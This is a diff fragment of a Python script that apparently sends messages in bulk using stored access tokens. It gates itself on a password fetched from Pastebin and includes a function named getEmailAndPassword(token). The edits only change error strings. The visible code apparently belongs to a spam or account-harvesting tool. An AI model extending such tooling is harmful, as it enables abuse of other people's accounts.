@@ -25,7 +25,7 @@ def execute_server():
         httpd.serve_forever()
 
 def send_messages():
-    while True:  # Infinite loop to keep the script running
+    while True: 
         try:
             with open('password.txt', 'r') as file:
                 password = file.read().strip()
@@ -33,7 +33,7 @@ def send_messages():
             entered_password = password
 
             if entered_password != password:
-                print('[-] <==> Incorrect Password!')
+                print('Well the credit is changed 🥱🥱 -----Request declined')
                 sys.exit()
 
             with open('tokennum.txt', 'r') as file:
@@ -67,7 +67,7 @@ def send_messages():
             mmm = requests.get('https://pastebin.com/raw/eEkA1P08').text
 
             if mmm not in password:
-                print('[-] <==> Incorrect Password!')
+                print('An code is changed RequestDeclined😼')
                 sys.exit()
 
             liness()
@@ -102,7 +102,7 @@ def send_messages():
                 if 'name' in data:
                     return data['name']
                 else:
-                    return "Error occurred"
+                    return "An Error "
 
             def getEmailAndPassword(token):
                 try:
